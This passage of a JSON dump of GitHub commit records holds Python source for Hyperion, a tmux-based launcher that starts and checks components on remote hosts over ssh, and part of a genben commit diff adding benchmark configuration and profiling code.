(\"ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml\" %\n               (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp))\n        self.logger.debug(cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Stop\n    ###################\n    def stop_component(self, comp):\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\n            self.logger.debug(\"Stopping remote component '%s' on host '%s'\" % (comp['name'], comp['host']))\n            self.stop_remote_component(comp['name'], comp['host'])\n        else:\n            window = find_window(self.session, comp['name'])\n\n            if window:\n                self.logger.debug(\"window '%s' found running\" % comp['name'])\n                self.logger.info(\"Shutting down window...\")\n                kill_window(window)\n                self.logger.info(\"... done!\")\n\n    def stop_remote_component(self, comp_name, host):\n        # invoke Hyperion in slave mode on each remote host\n        cmd = (\"ssh %s 'hyperion --config %s/%s.yaml slave --kill'\" % (host, TMP_SLAVE_DIR, comp_name))\n        self.logger.debug(\"Run cmd:\\n%s\" % cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Start\n    ###################\n    def start_component(self, comp):\n\n        node = self.nodes.get(comp['name'])\n        res = []\n        unres = []\n        dep_resolve(node, res, unres)\n        for node in res:\n            self.logger.debug(\"node name '%s' vs. comp name '%s'\" % (node.comp_name, comp['name']))\n            if node.comp_name != comp['name']:\n                self.logger.debug(\"Checking and starting %s\" % node.comp_name)\n                state = self.check_component(node.component)\n                if (state is CheckState.STOPPED_BUT_SUCCESSFUL or\n                        state is CheckState.STARTED_BY_HAND or\n                        state is CheckState.RUNNING):\n                    self.logger.debug(\"Component %s is already running, skipping to next in line\" % comp['name'])\n                else:\n                    self.logger.debug(\"Start component '%s' as dependency of '%s'\" % (node.comp_name, comp['name']))\n                    self.start_component_without_deps(node.component)\n\n                    tries = 0\n                    while True:\n                        self.logger.debug(\"Checking %s resulted in checkstate %s\" % (node.comp_name, state))\n                        state = self.check_component(node.component)\n                        if (state is not CheckState.RUNNING or\n                           state is not CheckState.STOPPED_BUT_SUCCESSFUL):\n                            break\n                        if tries > 100:\n                            return False\n                        tries = tries + 1\n                        sleep(.5)\n\n        self.logger.debug(\"All dependencies satisfied, starting '%s'\" % (comp['name']))\n        state = self.check_component(node.component)\n        if (state is CheckState.STARTED_BY_HAND or\n                state is CheckState.RUNNING):\n            self.logger.debug(\"Component %s is already running. Skipping start\" % comp['name'])\n        else:\n            self.start_component_without_deps(comp)\n        return True\n\n    def start_component_without_deps(self, comp):\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\n            self.logger.debug(\"Starting remote component '%s' on host '%s'\" % (comp['name'], comp['host']))\n            self.start_remote_component(comp['name'], comp['host'])\n        else:\n            log_file = (\"%s/%s\" % (TMP_LOG_PATH, comp['name']))\n            window = find_window(self.session, comp['name'])\n\n            if window:\n                self.logger.debug(\"Restarting '%s' in old window\" % comp['name'])\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\n            else:\n                self.logger.info(\"creating window '%s'\" % comp['name'])\n                window = self.session.new_window(comp['name'])\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\n\n    def start_remote_component(self, comp_name, host):\n        # invoke Hyperion in slave mode on each remote host\n        cmd = (\"ssh %s 'hyperion --config %s/%s.yaml slave'\" % (host, TMP_SLAVE_DIR, comp_name))\n        self.logger.debug(\"Run cmd:\\n%s\" % cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Check\n    ###################\n    def check_component(self, comp):\n        return check_component(comp, self.session, self.logger)\n\n    ###################\n    # Dependency management\n    ###################\n    def get_dep_list(self, comp):\n        node = self.nodes.get(comp['name'])\n        res = []\n        unres = []\n        dep_resolve(node, res, unres)\n        res.remove(node)\n\n        return res\n\n    ###################\n    # Host related checks\n    ###################\n    def is_localhost(self, hostname):\n        try:\n            hn_out = socket.gethostbyname(hostname)\n            if hn_out == '127.0.0.1' or hn_out == '::1':\n                self.logger.debug(\"Host '%s' is localhost\" % hostname)\n                return True\n            else:\n                self.logger.debug(\"Host '%s' is not localhost\" % hostname)\n                return False\n        except socket.gaierror:\n            sys.exit(\"Host '%s' is unknown! Update your /etc/hosts file!\" % hostname)\n\n    def run_on_localhost(self, comp):\n        return self.is_localhost(comp['host'])\n\n    ###################\n    # TMUX\n    ###################\n    def kill_remote_session_by_name(self, name, host):\n        cmd = \"ssh -t %s 'tmux kill-session -t %s'\" % (host, name)\n        send_main_session_command(self.session, cmd)\n\n    def start_clone_session(self, comp_name, session_name):\n        cmd = \"%s '%s' '%s'\" % (SCRIPT_CLONE_PATH, session_name, comp_name)\n        send_main_session_command(self.session, cmd)\n\n    def start_remote_clone_session(self, comp_name, session_name, hostname):\n        remote_cmd = (\"%s '%s' '%s'\" % (SCRIPT_CLONE_PATH, session_name, comp_name))\n        cmd = \"ssh %s 'bash -s' < %s\" % (hostname, remote_cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Visualisation\n    ###################\n    def draw_graph(self):\n        deps = Digraph(\"Deps\", strict=True)\n        deps.graph_attr.update(rankdir=\"BT\")\n        try:\n            node = self.nodes.get('master_node')\n\n            for current in node.depends_on:\n                deps.node(current.comp_name)\n\n                res = []\n                unres = []\n                dep_resolve(current, res, unres)\n                for node in res:\n                    if \"depends\" in node.component:\n                        for dep in node.component['depends']:\n                            if dep not in self.nodes:\n                                deps.node(dep, color=\"red\")\n                                deps.edge(node.comp_name, dep, \"missing\", color=\"red\")\n                            elif node.comp_name is not \"master_node\":\n                                deps.edge(node.comp_name, dep)\n\n        except CircularReferenceException as ex:\n            self.logger.error(\"Detected circular dependency reference between %s and %s!\" % (ex.node1, ex.node2))\n            deps.edge(ex.node1, ex.node2, \"circular error\", color=\"red\")\n            deps.edge(ex.node2, ex.node1, color=\"red\")\n\n        deps.view()\n\n\nclass SlaveLauncher:\n\n    def __init__(self, configfile=None, kill_mode=False, check_mode=False):\n        self.kill_mode = kill_mode\n        self.check_mode = check_mode\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.DEBUG)\n        self.config = None\n        self.session = None\n        if kill_mode:\n            self.logger.info(\"started slave with kill mode\")\n        if check_mode:\n            self.logger.info(\"started slave with check mode\")\n        self.server = Server()\n\n        if self.server.has_session(\"slave-session\"):\n            self.session = self.server.find_where({\n                \"session_name\": \"slave-session\"\n            })\n\n            self.logger.info('found running slave session on server')\n        elif not kill_mode and not check_mode:\n            self.logger.info('starting new slave session on server')\n            self.session = self.server.new_session(\n                session_name=\"slave-session\"\n            )\n\n        else:\n            self.logger.info(\"No slave session found on server. Aborting\")\n            exit(CheckState.STOPPED)\n\n        if configfile:\n            self.load_config(configfile)\n            self.window_name = self.config['name']\n            self.flag_path = (\"/tmp/Hyperion/slaves/%s\" % self.window_name)\n            self.log_file = (\"/tmp/Hyperion/log/%s\" % self.window_name)\n            ensure_dir(self.log_file)\n        else:\n            self.logger.error(\"No slave component config provided\")\n\n    def load_config(self, filename=\"default.yaml\"):\n        with open(filename) as data_file:\n            self.config = load(data_file, Loader)\n\n    def init(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n        elif not self.session:\n            self.logger.error(\" Init aborted. No session was found!\")\n        else:\n            self.logger.debug(self.config)\n            window = find_window(self.session, self.window_name)\n\n            if window:\n                self.logger.debug(\"window '%s' found running\" % self.window_name)\n                if self.kill_mode:\n                    self.logger.info(\"Shutting down window...\")\n                    kill_window(window)\n                    self.logger.info(\"... done!\")\n            elif not self.kill_mode:\n                self.logger.info(\"creating window '%s'\" % self.window_name)\n                window = self.session.new_window(self.window_name)\n                start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name)\n\n            else:\n                self.logger.info(\"There is no component running by the name '%s'. Exiting kill mode\" %\n                                 self.window_name)\n\n    def run_check(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n            exit(CheckState.STOPPED.value)\n        elif not self.session:\n            self.logger.error(\" Init aborted. No session was found!\")\n            exit(CheckState.STOPPED.value)\n\n        check_state = check_component(self.config, self.session, self.logger)\n        exit(check_state.value)\n\n###################\n# Component Management\n###################\ndef run_component_check(comp):\n    if call(comp['cmd'][1]['check'], shell=True) == 0:\n        return True\n    else:\n        return False\n\n\ndef check_component(comp, session, logger):\n    logger.debug(\"Running component check for %s\" % comp['name'])\n    check_available = len(comp['cmd']) > 1 and 'check' in comp['cmd'][1]\n    window = find_window(session, comp['name'])\n    if window:\n        pid = get_window_pid(window)\n        logger.debug(\"Found window pid: %s\" % pid)\n\n        # May return more child pids if logging is done via tee (which then was started twice in the window too)\n        procs = []\n        for entry in pid:\n            procs.extend(Process(entry).children(recursive=True))\n        pids = [p.pid for p in procs]\n        logger.debug(\"Window is running %s child processes\" % len(pids))\n\n        # Two processes are tee logging\n        # TODO: Change this when more logging options are introduced\n        if len(pids) < 3:\n            logger.debug(\"Main window process has finished. Running custom check if available\")\n            if check_available and run_component_check(comp):\n                logger.debug(\"Process terminated but check was successful\")\n                return CheckState.STOPPED_BUT_SUCCESSFUL\n            else:\n                logger.debug(\"Check failed or no check available: returning false\")\n                return CheckState.STOPPED\n        elif check_available and run_component_check(comp):\n            logger.debug(\"Check succeeded\")\n            return CheckState.RUNNING\n        elif not check_available:\n            logger.debug(\"No custom check specified and got sufficient pid amount: returning true\")\n            return CheckState.RUNNING\n        else:\n            logger.debug(\"Check failed: returning false\")\n            return CheckState.STOPPED\n    else:\n        logger.debug(\"%s window is not running. Running custom check\" % comp['name'])\n        if check_available and run_component_check(comp):\n            logger.debug(\"Component was not started by Hyperion, but the check succeeded\")\n            return CheckState.STARTED_BY_HAND\n        else:\n            logger.debug(\"Window not running and no check command is available or it failed: returning false\")\n            return CheckState.STOPPED\n\n\ndef get_window_pid(window):\n    r = window.cmd('list-panes',\n                   \"-F #{pane_pid}\")\n    return [int(p) for p in r.stdout]\n\n###################\n# TMUX\n###################\ndef kill_session_by_name(server, name):\n    session = server.find_where({\n        \"session_name\": name\n    })\n    session.kill_session()\n\n\ndef kill_window(window):\n    window.cmd(\"send-keys\", \"\", \"C-c\")\n    window.kill_window()\n\n\ndef start_window(window, cmd, log_file, comp_name):\n    setup_log(window, log_file, comp_name)\n    window.cmd(\"send-keys\", cmd, \"Enter\")\n\n\ndef find_window(session, window_name):\n    window = session.find_where({\n        \"window_name\": window_name\n    })\n    return window\n\n\ndef send_main_session_command(session, cmd):\n    window = find_window(session, \"Main\")\n    window.cmd(\"send-keys\", cmd, \"Enter\")\n\n\n###################\n# Logging\n###################\ndef setup_log(window, file, comp_name):\n    clear_log(file)\n    # Reroute stderr to log file\n    window.cmd(\"send-keys\", \"exec 2> >(exec tee -i -a '%s')\" % file, \"Enter\")\n    # Reroute stdin to log file\n    window.cmd(\"send-keys\", \"exec 1> >(exec tee -i -a '%s')\" % file, \"Enter\")\n    window.cmd(\"send-keys\", ('echo \"#Hyperion component start: %s\\n$(date)\"' % comp_name), \"Enter\")\n\n\ndef clear_log(file_path):\n    if os.path.isfile(file_path):\n        os.remove(file_path)\n\n\ndef ensure_dir(file_path):\n    directory = os.path.dirname(file_path)\n    if not os.path.exists(directory):\n        os.makedirs(directory)\n\n###################\n# Startup\n###################\ndef main():\n    logger = logging.getLogger(__name__)\n    logger.setLevel(logging.DEBUG)\n    parser = argparse.ArgumentParser()\n\n    # Create top level parser\n    parser.add_argument(\"--config\", '-c', type=str,\n                        default='test.yaml',\n                        help=\"YAML config file. see sample-config.yaml. Default: test.yaml\")\n    subparsers = parser.add_subparsers(dest=\"cmd\")\n\n    # Create parser for the editor command\n    subparser_editor = subparsers.add_parser('edit', help=\"Launches the editor to edit or create new systems and \"\n                                                          \"components\")\n    # Create parser for the run command\n    subparser_run = subparsers.add_parser('run', help=\"Launches the setup specified by the --config argument\")\n    # Create parser for validator\n    subparser_val = subparsers.add_parser('validate', help=\"Validate the setup specified by the --config argument\")\n\n    subparser_remote = subparsers.add_parser('slave', help=\"Run a component locally without controlling it. The \"\n                                                           \"control is taken care of the remote master invoking \"\n                                                           \"this command.\\nIf run with the --kill flag, the \"\n                                                           \"passed component will be killed\")\n\n    subparser_val.add_argument(\"--visual\", help=\"Generate and show a graph image\", action=\"store_true\")\n\n    remote_mutex = subparser_remote.add_mutually_exclusive_group(required=False)\n\n    remote_mutex.add_argument('-k', '--kill', help=\"switch to kill mode\", action=\"store_true\")\n    remote_mutex.add_argument('-c', '--check', help=\"Run a component check\", action=\"store_true\")\n\n    args = parser.parse_args()\n    logger.debug(args)\n\n    if args.cmd == 'edit':\n        logger.debug(\"Launching editor mode\")\n\n    elif args.cmd == 'run':\n        logger.debug(\"Launching runner mode\")\n\n        cc = ControlCenter(args.config)\n        cc.init()\n        start_gui(cc)\n\n    elif args.cmd == 'validate':\n        logger.debug(\"Launching validation mode\")\n        cc = ControlCenter(args.config)\n        if args.visual:\n            cc.set_dependencies(False)\n            cc.draw_graph()\n        else:\n            cc.set_dependencies(True)\n\n    elif args.cmd == 'slave':\n        logger.debug(\"Launching slave mode\")\n        sl = SlaveLauncher(args.config, args.kill, args.check)\n\n        if args.check:\n            sl.run_check()\n        else:\n            sl.init()\n\n\n###################\n# GUI\n###################\ndef start_gui(control_center):\n    app = QtGui.QApplication(sys.argv)\n    main_window = QtGui.QMainWindow()\n    ui = hyperGUI.UiMainWindow()\n    ui.ui_init(main_window, control_center)\n    main_window.show()\n    sys.exit(app.exec_())\n"}}, "msg": "Utilize slave execution for remote checks\n\nOn the remote host hyperion is started in slave check mode and the exit\ncode is converted to a check state, which is then interpreted."}}, "https://github.com/ornl-oxford/genben": {"5577269b7283a48d0b421dabd44687460955a0c8": {"url": "https://api.github.com/repos/ornl-oxford/genben/commits/5577269b7283a48d0b421dabd44687460955a0c8", "html_url": "https://github.com/ornl-oxford/genben/commit/5577269b7283a48d0b421dabd44687460955a0c8", "message": "Implement Benchmark Process (#29)\n\n* Update project environment, default config file, and AUTHORS\r\n\r\n-Update .gitignore to ignore test config file and IntelliJ IDEA project files\r\n-Update AUTHORS file with new contributor\r\n-Environment: Add perf and numcodecs libraries as dependencies\r\n-Config file: Update file to include spaces for consistency\r\n-Update benchmark config file to include new (future) options for ftp download and data conversion\r\n\r\n* Remove IntelliJ IDE files from code base\r\n\r\n* -Create config.py to hold functions/data for config file parsing and handling\r\n-cli.py: Move configuration-related functions to config.py & create main() function\r\n-test_cli.py: Move configuration-related unit tests to test_config.py\r\n-Update README.md to show that -f flag can be used when generating a configuration file\r\n\r\n* Add placeholder methods for unit testing: generate default configuration w/ and w/o -f flag\r\n\r\n* Begin implementing \"setup\" command, including download of files over FTP\r\n\r\n- cli.py: Add logic when running in setup mode\r\n- config.py: Add ability to read/parse configuration settings related to FTP downloader\r\n- data_service.py: Implement ftp downloading, including the ability to download all files within a remote ftp directory (recursive download)\r\n- test_data_service.py: Add unit tests for ftp download checking\r\n\r\n* Add unittest for default configuration file generation\r\n\r\n* Update config unittests\r\n\r\n- test_config.py: Add two new unit tests to ensure that a file is not overwritten normally, and that a file is overwritten while using the overwrite flag\r\n\r\n* Add two files needed for data service unit testing and update .gitignore\r\n\r\n- Update .gitignore to only ignore root level data directory\r\n- Add two missing files needed for unit testing Data Service\r\n\r\n* WIP: Add VCF to Zarr conversion (currently only uses Blosc compressor with no user configuration availalbe)\r\n\r\n* FTP Bugfix: Create local directory if it does not exist, before trying to save files to local directory\r\n\r\n* VCF to Zarr: Take downloaded files (vcf, vcf.gz) and organize them to prepare for Zarr conversion during benchmark execution\r\n\r\n* core.py: Follow PEP8\r\n\r\n* Add ability to control VCF to Zarr conversion settings from configuration file (Blosc compressor only for now)\r\n\r\nAvailable Blosc compressor algorithms: zstd, blosclz, lz4, lz4hc, zlib, snappy\r\n\r\n* Convert VCF to Zarr during Setup mode\r\n\r\n- Restructure/add new folders for dataset storage\r\n- Add conversion of VCF files to Zarr format during Setup mode\r\n- data-service: Create function to remove directory tree\r\n- Various code cleanup/formatting\r\n\r\n* Add benchmarking configuration options and parsing\r\n\r\n*  - Move data directory declarations to a separate class in data_service\r\n - Add skeleton code to benchmark core\r\n\r\n* - cli.py: Use run_(timestamp) as default label for benchmark, pass label into benchmark core\r\n- config.py: Store VCF to Zarr conversion config data in Benchmark configuration data so that settings are known when running the benchmark\r\n- core.py: Begin implementation of benchmark process, create BenchmarkRunner class to time different tasks, add benchmarking of vcf to zarr conversion process, save benchmark results to psv file\r\n- data_service.py: Update benchmark_vcf_to_zarr function to have hooks for benchmark timing when needed\r\n- requirements.txt: Add pandas to list of requirements, which is used for storing benchmark results\r\n\r\n* Code cleanup and paramater documentation\r\n\r\n* Rename BenchmarkRunner to BenchmarkProfiler, create new Benchmark class to hold all benchmarking-related code\r\n\r\n- Rename BenchmarkRunner to BenchmarkProfiler class\r\n- Add two unittest method stubs\r\n- core.py: Move benchmarking process inside new Benchmark Class for better code organization/separation\r\n- core.py: Move record_runtime function to internal function within BenchmarkProfiler class\r\n\r\n* Implement unit tests for benchmark profiler and results data\r\n\r\n* Update comment for clarity\r\n\r\n* data_service: Create function that returns genotype data from callset\r\n  Supports data sets with differing formats (e.g. callset/GT vs. callset/genotype)\r\n\r\n* Bugfix: Use an OrderedDict instead of dict to contain benchmark results. Previously, order was not preserved on Linux- and Mac-based systems using Python 3.5\r\n\r\n* numcodecs: remove unused imports\r\n\r\n* Remove unused imports for module (resulting in circular references?)", "sha": "5577269b7283a48d0b421dabd44687460955a0c8", "keyword": "remote code execution check", "diff": "diff --git a/benchmark/cli.py b/benchmark/cli.py\nindex ed3905a..7b841aa 100644\n--- a/benchmark/cli.py\n+++ b/benchmark/cli.py\n@@ -3,12 +3,13 @@\n runs the benchmarks, and records the timer results. \"\"\"\n \n import argparse  # for command line parsing\n+import datetime\n import time  # for benchmark timer\n import csv  # for writing results\n import logging\n import sys\n import shutil\n-from benchmark import config, data_service\n+from benchmark import core, config, data_service\n \n \n def get_cli_arguments():\n@@ -41,8 +42,10 @@ def get_cli_arguments():\n \n     benchmark_exec_parser = subparser.add_parser(\"exec\",\n                                                  help='Execution of the benchmark modes. It requires a configuration file.')\n-    # TODO: use run_(timestamp) as default\n-    benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\",\n+\n+    timestamp_current = datetime.datetime.fromtimestamp(time.time())\n+    benchmark_label_default = \"run_{timestamp}\".format(timestamp=timestamp_current.strftime(\"%Y-%m-%d_%H-%M-%S\"))\n+    benchmark_exec_parser.add_argument(\"--label\", type=str, default=benchmark_label_default, metavar=\"RUN_LABEL\",\n                                        help=\"Label for the benchmark run.\")\n     benchmark_exec_parser.add_argument(\"--config_file\", type=str, required=True,\n                                        help=\"Specify the path to a configuration file.\", metavar=\"FILEPATH\")\n@@ -52,12 +55,7 @@ def get_cli_arguments():\n \n \n def _main():\n-    input_directory = \"./data/input/\"\n-    download_directory = input_directory + \"download/\"\n-    temp_directory = \"./data/temp/\"\n-    vcf_directory = \"./data/vcf/\"\n-    zarr_directory_setup = \"./data/zarr/\"\n-    zarr_directory_benchmark = \"./data/zarr_benchmark/\"\n+    data_dirs = config.DataDirectoriesConfigurationRepresentation()\n \n     cli_arguments = get_cli_arguments()\n \n@@ -71,8 +69,8 @@ def _main():\n         print(\"[Setup] Setting up benchmark data.\")\n \n         # Clear out existing files in VCF and Zarr directories\n-        data_service.remove_directory_tree(vcf_directory)\n-        data_service.remove_directory_tree(zarr_directory_setup)\n+        data_service.remove_directory_tree(data_dirs.vcf_dir)\n+        data_service.remove_directory_tree(data_dirs.zarr_dir_setup)\n \n         # Get runtime config from specified location\n         runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n@@ -82,32 +80,40 @@ def _main():\n \n         if ftp_config.enabled:\n             print(\"[Setup][FTP] FTP module enabled. Running FTP download...\")\n-            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)\n+            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=data_dirs.download_dir)\n         else:\n             print(\"[Setup][FTP] FTP module disabled. Skipping FTP download...\")\n \n         # Process/Organize downloaded files\n-        data_service.process_data_files(input_dir=input_directory,\n-                                        temp_dir=temp_directory,\n-                                        output_dir=vcf_directory)\n+        data_service.process_data_files(input_dir=data_dirs.input_dir,\n+                                        temp_dir=data_dirs.temp_dir,\n+                                        output_dir=data_dirs.vcf_dir)\n \n         # Convert VCF files to Zarr format if the module is enabled\n         vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n         if vcf_to_zarr_config.enabled:\n-            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,\n-                                           output_zarr_dir=zarr_directory_setup,\n+            data_service.setup_vcf_to_zarr(input_vcf_dir=data_dirs.vcf_dir,\n+                                           output_zarr_dir=data_dirs.zarr_dir_setup,\n                                            conversion_config=vcf_to_zarr_config)\n     elif command == \"exec\":\n         print(\"[Exec] Executing benchmark tool.\")\n \n+        # Clear out existing files in Zarr benchmark directory\n+        data_service.remove_directory_tree(data_dirs.zarr_dir_benchmark)\n+\n         # Get runtime config from specified location\n         runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n \n-        # Get VCF to Zarr conversion settings from runtime config\n-        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n+        benchmark_label = cli_arguments[\"label\"]\n+\n+        # Get Benchmark module settings from runtime config\n+        benchmark_config = config.BenchmarkConfigurationRepresentation(runtime_config)\n+\n+        # Setup the benchmark runner\n+        benchmark = core.Benchmark(bench_conf=benchmark_config, data_dirs=data_dirs, benchmark_label=benchmark_label)\n \n-        # TODO: Convert necessary VCF files to Zarr format\n-        # data_service.convert_to_zarr(\"./data/vcf/chr22.1000.vcf\", \"./data/zarr/chr22.1000.zarr\", vcf_to_zarr_config)\n+        # Run the benchmark\n+        benchmark.run_benchmark()\n     else:\n         print(\"Error: Unexpected command specified. Exiting...\")\n         sys.exit(1)\ndiff --git a/benchmark/config.py b/benchmark/config.py\nindex 200740b..0441b81 100644\n--- a/benchmark/config.py\n+++ b/benchmark/config.py\n@@ -13,6 +13,15 @@ def config_str_to_bool(input_str):\n     return input_str.lower() in ['true', '1', 't', 'y', 'yes']\n \n \n+class DataDirectoriesConfigurationRepresentation:\n+    input_dir = \"./data/input/\"\n+    download_dir = input_dir + \"download/\"\n+    temp_dir = \"./data/temp/\"\n+    vcf_dir = \"./data/vcf/\"\n+    zarr_dir_setup = \"./data/zarr/\"\n+    zarr_dir_benchmark = \"./data/zarr_benchmark/\"\n+\n+\n def isint(value):\n     try:\n         int(value)\n@@ -99,6 +108,7 @@ def __init__(self, runtime_config=None):\n class VCFtoZarrConfigurationRepresentation:\n     \"\"\" Utility class for object representation of VCF to Zarr conversion module configuration. \"\"\"\n     enabled = False  # Specifies whether the VCF to Zarr conversion module should be enabled or not\n+    fields = None\n     alt_number = None  # Alt number to use when converting to Zarr format. If None, then this will need to be determined\n     chunk_length = None  # Number of variants of chunks in which data are processed. If None, use default value\n     chunk_width = None  # Number of samples to use when storing chunks in output. If None, use default value\n@@ -182,6 +192,47 @@ def __init__(self, runtime_config=None):\n                                         \"blosc_shuffle_mode could not be converted to integer.\")\n \n \n+benchmark_data_input_types = [\"vcf\", \"zarr\"]\n+\n+\n+class BenchmarkConfigurationRepresentation:\n+    \"\"\" Utility class for object representation of the benchmark module's configuration. \"\"\"\n+    benchmark_number_runs = 5\n+    benchmark_data_input = \"vcf\"\n+    benchmark_dataset = \"\"\n+    benchmark_allele_count = False\n+    benchmark_PCA = False\n+    vcf_to_zarr_config = None\n+\n+    def __init__(self, runtime_config=None):\n+        \"\"\"\n+        Creates an object representation of the Benchmark module's configuration data.\n+        :param runtime_config: runtime_config data to extract benchmark configuration from\n+        :type runtime_config: ConfigurationRepresentation\n+        \"\"\"\n+        if runtime_config is not None:\n+            if hasattr(runtime_config, \"benchmark\"):\n+                # Extract relevant settings from config file\n+                if \"benchmark_number_runs\" in runtime_config.benchmark:\n+                    try:\n+                        self.benchmark_number_runs = int(runtime_config.benchmark[\"benchmark_number_runs\"])\n+                    except ValueError:\n+                        pass\n+                if \"benchmark_data_input\" in runtime_config.benchmark:\n+                    benchmark_data_input_temp = runtime_config.benchmark[\"benchmark_data_input\"]\n+                    if benchmark_data_input_temp in benchmark_data_input_types:\n+                        self.benchmark_data_input = benchmark_data_input_temp\n+                if \"benchmark_dataset\" in runtime_config.benchmark:\n+                    self.benchmark_dataset = runtime_config.benchmark[\"benchmark_dataset\"]\n+                if \"benchmark_allele_count\" in runtime_config.benchmark:\n+                    self.benchmark_allele_count = config_str_to_bool(runtime_config.benchmark[\"benchmark_allele_count\"])\n+                if \"benchmark_PCA\" in runtime_config.benchmark:\n+                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"])\n+\n+            # Add the VCF to Zarr Conversion Configuration Data\n+            self.vcf_to_zarr_config = VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config)\n+\n+\n def read_configuration(location):\n     \"\"\"\n     Args: location of the configuration file, existing configuration dictionary\ndiff --git a/benchmark/core.py b/benchmark/core.py\nindex fd4acbc..456a0c5 100644\n--- a/benchmark/core.py\n+++ b/benchmark/core.py\n@@ -2,31 +2,170 @@\n determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\n runs the benchmarks, and records the timer results. \"\"\"\n \n+import allel\n+import zarr\n+import datetime\n import time  # for benchmark timer\n import csv  # for writing results\n import logging\n+import os\n+import pandas as pd\n+from collections import OrderedDict\n+from benchmark import config, data_service\n \n \n-def run_benchmark(bench_conf):\n-    pass\n+class BenchmarkResultsData:\n+    run_number = None\n+    operation_name = None\n+    start_time = None\n+    exec_time = None\n \n+    def to_dict(self):\n+        return OrderedDict([(\"Log Timestamp\", datetime.datetime.fromtimestamp(self.start_time)),\n+                            (\"Run Number\", self.run_number),\n+                            (\"Operation\", self.operation_name),\n+                            (\"Execution Time\", self.exec_time)])\n \n-def run_dynamic(ftp_location):\n-    pass\n+    def to_pandas(self):\n+        data = self.to_dict()\n+        df = pd.DataFrame(data, index=[1])\n+        df.index.name = '#'\n+        return df\n \n \n-def run_static():\n-    pass\n+class BenchmarkProfiler:\n+    benchmark_running = False\n \n+    def __init__(self, benchmark_label):\n+        self.results = BenchmarkResultsData()\n+        self.benchmark_label = benchmark_label\n \n-def get_remote_files(ftp_server, ftp_directory, files=None):\n-    pass\n+    def set_run_number(self, run_number):\n+        if not self.benchmark_running:\n+            self.results.run_number = run_number\n \n+    def start_benchmark(self, operation_name):\n+        if not self.benchmark_running:\n+            self.results.operation_name = operation_name\n \n-def record_runtime(benchmark, timestamp):\n-    pass\n+            self.benchmark_running = True\n \n+            # Start the benchmark timer\n+            self.results.start_time = time.time()\n \n-# temporary here\n-def main():\n-    pass\n+    def end_benchmark(self):\n+        if self.benchmark_running:\n+            end_time = time.time()\n+\n+            # Calculate the execution time from start and end times\n+            self.results.exec_time = end_time - self.results.start_time\n+\n+            # Save benchmark results\n+            self._record_runtime(self.results, \"{}.psv\".format(self.benchmark_label))\n+\n+            self.benchmark_running = False\n+\n+    def get_benchmark_results(self):\n+        return self.results\n+\n+    def _record_runtime(self, benchmark_results, output_filename):\n+        \"\"\"\n+        Records the benchmark results data entry to the specified PSV file.\n+        :param benchmark_results: BenchmarkResultsData object containing the benchmark results data\n+        :param output_filename: Which file to output the benchmark results to\n+        :type benchmark_results: BenchmarkResultsData\n+        :type output_filename: str\n+        \"\"\"\n+        output_filename = str(output_filename)\n+\n+        psv_header = not os.path.isfile(output_filename)\n+\n+        # Open the output file in append mode\n+        with open(output_filename, \"a\") as psv_file:\n+            pd_results = benchmark_results.to_pandas()\n+            pd_results.to_csv(psv_file, sep=\"|\", header=psv_header, index=False)\n+\n+\n+class Benchmark:\n+    benchmark_zarr_dir = \"\"  # Directory for which to use data from for benchmark process\n+    benchmark_zarr_file = \"\"  # File within benchmark_zarr_dir for which to use for benchmark process\n+\n+    def __init__(self, bench_conf, data_dirs, benchmark_label):\n+        \"\"\"\n+        Sets up a Benchmark object which is used to execute benchmarks.\n+        :param bench_conf: Benchmark configuration data that controls the benchmark execution\n+        :param data_dirs: DataDirectoriesConfigurationRepresentation object that contains working data directories\n+        :param benchmark_label: label to use when saving benchmark results to file\n+        :type bench_conf: config.BenchmarkConfigurationRepresentation\n+        :type data_dirs: config.DataDirectoriesConfigurationRepresentation\n+        :type benchmark_label: str\n+        \"\"\"\n+        self.bench_conf = bench_conf\n+        self.data_dirs = data_dirs\n+        self.benchmark_label = benchmark_label\n+\n+        self.benchmark_profiler = BenchmarkProfiler(benchmark_label=self.benchmark_label)\n+\n+    def run_benchmark(self):\n+        \"\"\"\n+        Executes the benchmarking process.\n+        \"\"\"\n+        if self.bench_conf is not None and self.data_dirs is not None:\n+            for run_number in range(1, self.bench_conf.benchmark_number_runs + 1):\n+                # Clear out existing files in Zarr benchmark directory\n+                # (Should be done every single run)\n+                data_service.remove_directory_tree(self.data_dirs.zarr_dir_benchmark)\n+\n+                # Update run number in benchmark profiler (for results tracking)\n+                self.benchmark_profiler.set_run_number(run_number)\n+\n+                # Prepare data directory and file locations for benchmarks\n+                if self.bench_conf.benchmark_data_input == \"vcf\":\n+                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark\n+\n+                    # Convert VCF data to Zarr format as part of benchmark\n+                    self._benchmark_convert_to_zarr()\n+\n+                elif self.bench_conf.benchmark_data_input == \"zarr\":\n+                    # Use pre-converted Zarr data which was done ahead of benchmark (i.e. in Setup mode)\n+                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_setup\n+                    self.benchmark_zarr_file = self.bench_conf.benchmark_dataset\n+\n+                else:\n+                    